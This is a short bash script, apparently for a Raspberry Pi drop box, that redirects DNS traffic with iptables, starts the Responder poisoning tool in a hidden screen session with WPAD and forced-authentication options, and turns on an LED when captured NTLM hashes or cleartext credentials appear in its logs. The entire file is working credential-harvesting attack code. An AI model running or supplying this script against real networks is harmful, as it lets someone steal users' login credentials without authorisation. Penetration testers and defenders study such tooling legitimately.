#!/bin/bash

echo '[*] running Responder attacks'
HOME='/home/pi/'

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 53) = '' ]] && {
  iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
}

[[ $(pgrep -f Responder.py) = '' ]] && {
	screen -dmS responder python3 $HOME/src/responder/Responder.py -I "$1" -r -d -w -F
}

inotifywait -e MODIFY -rm $HOME/src/responder/logs | while read event
do
 	if echo $event | grep -e NTLM -e ClearText; then
 		led yellow on 2> /dev/null
 	fi
done